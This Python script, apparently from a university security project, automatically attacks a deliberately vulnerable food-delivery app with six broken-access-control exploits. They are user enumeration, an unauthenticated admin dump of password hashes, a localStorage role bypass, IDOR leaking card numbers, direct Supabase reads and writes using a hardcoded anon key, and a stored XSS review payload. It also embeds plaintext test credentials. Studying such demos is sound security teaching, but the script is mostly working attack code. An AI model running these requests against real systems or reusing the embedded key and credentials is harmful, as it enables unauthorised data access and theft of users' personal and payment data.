#!/usr/bin/env python3
"""
A01: Broken Access Control -- Automated Attack Demo
===================================================
CraveKart University Security Project

Demonstrates 6 access-control vulnerabilities:
  1. User Enumeration         -- /api/login reveals valid emails
  2. Unauth Admin Data Dump   -- /api/admin/users dumps everything
  3. Client-Side Role Gate    -- role check lives in localStorage only
  4. IDOR on Orders           -- /api/orders/[id] leaks any order + card
  5. RLS Disabled             -- anon key reads/writes every table
  6. Unauth Review Posting    -- /api/reviews accepts anything

Usage:
    py scripts/a01_broken_access_control.py [BASE_URL]

    BASE_URL defaults to http://localhost:3000
"""

import sys
import json
import requests

# -- Config ------------------------------------------------------------------

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
SUPABASE_URL = "https://xcjgpffjfeoydsevivrr.supabase.co"
ANON_KEY = "sb_publishable_9SKE0PoVf78Ew2DP32AvLw_3xOqi4aD"

# -- Helpers -----------------------------------------------------------------

RESET  = "\033[0m"
BOLD   = "\033[1m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
DIM    = "\033[2m"

session = requests.Session()


def banner(num, title):
    print()
    print("=" * 70)
    print("  ATTACK {}: {}".format(num, title))
    print("=" * 70)
    print()


def vuln(msg):
    print("  {}[VULN] {}{}".format(BOLD + RED, msg, RESET))


def info(msg):
    print("  {}{}{}".format(DIM, msg, RESET))


def ok(msg):
    print("  {}{}{}".format(GREEN, msg, RESET))


# -- Attack 1: User Enumeration ---------------------------------------------

def attack_user_enumeration():
    banner(1, "User Enumeration via /api/login")
    info("The login endpoint returns DIFFERENT error messages depending on")
    info("whether the email exists -- an attacker can harvest valid emails.")
    print()

    tests = [
        ("nobody@test.com",         "wrongpass",  "Non-existent email"),
        ("admin@cravekart.app",     "wrongpass",  "Valid email, wrong password"),
    ]

    for email, password, desc in tests:
        r = session.post("{}/api/login".format(BASE), json={
            "email": email,
            "password": password,
        })
        data = r.json()
        error = data.get("error", "(no error)")
        print("  {}POST{} /api/login".format(BOLD, RESET))
        info("  {}: email={}, password={}".format(desc, email, password))
        print("  --> HTTP {}  error={}\"{}\"".format(r.status_code, RED, error + RESET))

        if "no account" in error.lower():
            vuln("Email does NOT exist (oracle reveals non-existent user)")
        elif "incorrect password" in error.lower():
            vuln("Email EXISTS -- wrong password confirmed (oracle leak)")
        print()

    info("SUMMARY: Two distinct error strings let an attacker enumerate")
    info("which emails are registered before attempting brute-force.")
    print()


# -- Attack 2: Unauthenticated Admin Data Dump ------------------------------

def attack_admin_dump():
    banner(2, "Unauthenticated Admin Data Dump -- /api/admin/users")
    info("This endpoint has ZERO server-side authorization.")
    info("No token, no cookie, no header -- anyone can hit it.")
    print()

    print("  {}GET{} /api/admin/users".format(BOLD, RESET))
    info("  (no Authorization header, no cookies, nothing)")
    print()

    r = session.get("{}/api/admin/users".format(BASE))
    data = r.json()

    users = data.get("users", [])
    coupons = data.get("coupons", [])
    orders = data.get("orders", [])

    ok("  HTTP {}".format(r.status_code))
    print()
    ok("  USERS LEAKED:   {} records".format(len(users)))
    ok("  COUPONS LEAKED: {} records".format(len(coupons)))
    ok("  ORDERS LEAKED:  {} records".format(len(orders)))
    print()

    if users:
        info("  Leaked user data (first 5):")
        for u in users[:5]:
            md5 = u.get("password_md5", "N/A")
            md5_display = str(md5)[:16] + "..." if md5 and md5 != "N/A" and len(str(md5)) > 16 else md5
            print("    {:<40s} role={:<20s} md5={}".format(
                u.get("email", "?"),
                u.get("role", "?"),
                md5_display
            ))
        if len(users) > 5:
            info("    ... and {} more".format(len(users) - 5))
    print()

    vuln("Attacker obtained {} user records (including password hashes),".format(len(users)))
    vuln("{}, and {} orders -- with zero authentication.".format(
        "{} coupons".format(len(coupons)),
        len(orders)
    ))
    print()


# -- Attack 3: Client-Side Role Gate ----------------------------------------

def attack_client_side_role():
    banner(3, "Client-Side Role Gate (localStorage Bypass)")
    info("The admin panel checks localStorage['foodrush_user'].role")
    info("There is NO server-side authorization on any /admin/* route.")
    print()

    # Login as customer to get a valid session
    r = session.post("{}/api/login".format(BASE), json={
        "email": "priya@cravekart.app",
        "password": "priya123",
    })
    data = r.json()
    role = data.get("profile", {}).get("role", "?")

    ok("  Logged in as: {}".format(data.get("profile", {}).get("email", "?")))
    ok("  Server-returned role: {}".format(role))
    print()

    # Show what the attacker would do in DevTools
    info("  In the browser DevTools Console, an attacker runs:")
    print()
    print("    {}localStorage.setItem(\"foodrush_user\", JSON.stringify({{".format(YELLOW))
    print("      id: \"any-uuid\",")
    print("      email: \"attacker@evil.com\",")
    print("      role: \"admin\",")
    print("      name: \"Attacker\"")
    print("    }})){}".format(RESET))
    print()
    info("  Then navigates to /admin -> full admin dashboard loads.")
    info("  The role check is PURELY client-side -- the server never validates it.")
    print()

    # Prove the admin endpoints accept ANY request
    r_admin = session.get("{}/api/admin/users".format(BASE))
    ok("  GET /api/admin/users -> HTTP {} (no auth needed)".format(r_admin.status_code))
    info("  The entire admin panel is accessible without any server-side check.")
    print()

    vuln("Client-side role gate can be trivially bypassed via DevTools.")
    print()


# -- Attack 4: IDOR on Orders -----------------------------------------------

def attack_idor_orders():
    banner(4, "IDOR -- Insecure Direct Object Reference on Orders")
    info("/api/orders/[id] returns ANY order by ID -- no ownership check,")
    info("no authentication. Includes stored credit card numbers.")
    print()

    order_ids = [1001, 1002, 1003, 1004, 1005, 1006, 1007]

    header = "  {:<6s} {:<20s} {:>8s} {:<15s} {:<20s}".format(
        "ID", "RESTAURANT", "TOTAL", "STATUS", "CARD NUMBER"
    )
    print(header)
    print("  {:<6s} {:<20s} {:>8s} {:<15s} {:<20s}".format(
        "-----", "--------------------", "--------", "---------------", "--------------------"
    ))

    for oid in order_ids:
        r = session.get("{}/api/orders/{}".format(BASE, oid))
        data = r.json()
        order = data.get("order")
        if order:
            cc = order.get("cc_number", "N/A")
            print("  {:<6d} {:<20s} Rs.{:<5} {:<15s} {:<20s}".format(
                oid,
                order.get("restaurant_name", "?"),
                order.get("total", 0),
                order.get("status", "?"),
                cc or "N/A"
            ))
        else:
            print("  {:<6d} {:<20s}".format(oid, "(not found)"))

    print()
    info("  Request used (no auth header):")
    print("    GET {}/api/orders/1001".format(BASE))
    print()

    vuln("Any visitor can read ANY order including credit card numbers.")
    vuln("No authentication required -- just iterate order IDs.")
    print()


# -- Attack 5: RLS Disabled -- Direct Supabase Access -----------------------

def attack_rls_direct():
    banner(5, "RLS Disabled -- Direct Supabase REST Access")
    info("Row-Level Security is disabled on all tables.")
    info("The anon API key can read/write everything directly.")
    print()

    headers = {
        "apikey": ANON_KEY,
        "Authorization": "Bearer {}".format(ANON_KEY),
    }

    # Read users table directly via Supabase
    print("  {}GET{} /rest/v1/users?select=email,role,password_md5".format(BOLD, RESET))
    r = session.get(
        "{}/rest/v1/users?select=email,role,password_md5".format(SUPABASE_URL),
        headers=headers,
    )
    users = r.json()
    ok("  HTTP {} -- {} users read directly from Supabase".format(r.status_code, len(users)))
    print()

    for u in users:
        md5 = u.get("password_md5", "NULL")
        md5_str = str(md5)[:20] + "..." if md5 and md5 != "NULL" and len(str(md5)) > 20 else md5
        print("    {:<40s} {:<20s} md5={}".format(
            u.get("email", "?"),
            u.get("role", "?"),
            md5_str
        ))

    print()

    # Read orders table directly
    print("  {}GET{} /rest/v1/orders?select=id,cc_number,total".format(BOLD, RESET))
    r = session.get(
        "{}/rest/v1/orders?select=id,cc_number,total".format(SUPABASE_URL),
        headers=headers,
    )
    orders = r.json()
    ok("  HTTP {} -- {} orders read directly".format(r.status_code, len(orders)))
    print()

    for o in orders:
        print("    Order #{}  total=Rs.{}  card={}".format(
            o.get("id", "?"),
            o.get("total", 0),
            o.get("cc_number", "N/A")
        ))

    print()

    # Demonstrate WRITE access
    print("  {}POST{} /rest/v1/reviews  (write via anon key)".format(BOLD, RESET))
    r2 = session.post(
        "{}/rest/v1/reviews".format(SUPABASE_URL),
        headers={
            **headers,
            "Content-Type": "application/json",
            "Prefer": "return=representation",
        },
        json={
            "product_id": "00000000-0000-4000-a000-000000000001",
            "author": "RLS Attacker",
            "content": "RLS is off -- I can write directly to the database!",
            "rating": 1,
        },
    )
    ok("  HTTP {} -- review injected directly via Supabase REST".format(r2.status_code))
    print()

    vuln("RLS disabled on all tables -- anon key has full read/write access.")
    vuln("Attackers can dump, modify, or delete ANY data without authentication.")
    print()


# -- Attack 6: Unauthenticated Review Posting -------------------------------

def attack_unauth_review():
    banner(6, "Unauthenticated Review Posting -- /api/reviews")
    info("The review endpoint accepts POST requests with no authentication.")
    info("Content is stored verbatim -- enabling stored XSS.")
    print()

    payload = {
        "product_id": "00000000-0000-4000-a000-000000000001",
        "author": "Hacker",
        "content": "<script>alert('XSS')</script> This review was posted without any authentication!",
        "rating": 1,
    }

    print("  {}POST{} /api/reviews".format(BOLD, RESET))
    info("  Payload:")
    for line in json.dumps(payload, indent=4).split("\n"):
        info("    " + line)
    print()

    r = session.post("{}/api/reviews".format(BASE), json=payload)
    data = r.json()

    ok("  HTTP {}".format(r.status_code))

    if r.status_code in (200, 201):
        vuln("Review stored successfully -- no authentication required!")
        vuln("The <script> tag in 'content' will execute when rendered on the product page (Stored XSS).")
    else:
        info("  Response: {}".format(json.dumps(data)))

    print()


# -- Main --------------------------------------------------------------------

def main():
    print()
    print("#" * 70)
    print("  A01: Broken Access Control -- Automated Attack Script")
    print("  Target: {}".format(BASE))
    print("  Supabase: {}".format(SUPABASE_URL))
    print("#" * 70)

    attacks = [
        attack_user_enumeration,
        attack_admin_dump,
        attack_client_side_role,
        attack_idor_orders,
        attack_rls_direct,
        attack_unauth_review,
    ]

    for attack in attacks:
        try:
            attack()
        except requests.ConnectionError:
            print()
            print("  [ERROR] Could not connect to {}".format(BASE))
            print("  Make sure the dev server is running: npm run dev --webpack")
            print()
            sys.exit(1)
        except Exception as e:
            print()
            print("  [ERROR] {}".format(e))
            print()

    print("=" * 70)
    print("  ALL 6 ATTACKS COMPLETED")
    print("=" * 70)
    print()
    print("  Each attack demonstrates a different A01 Broken Access Control flaw.")
    print("  These are INTENTIONAL vulnerabilities for your university demo.")
    print()


if __name__ == "__main__":
    main()
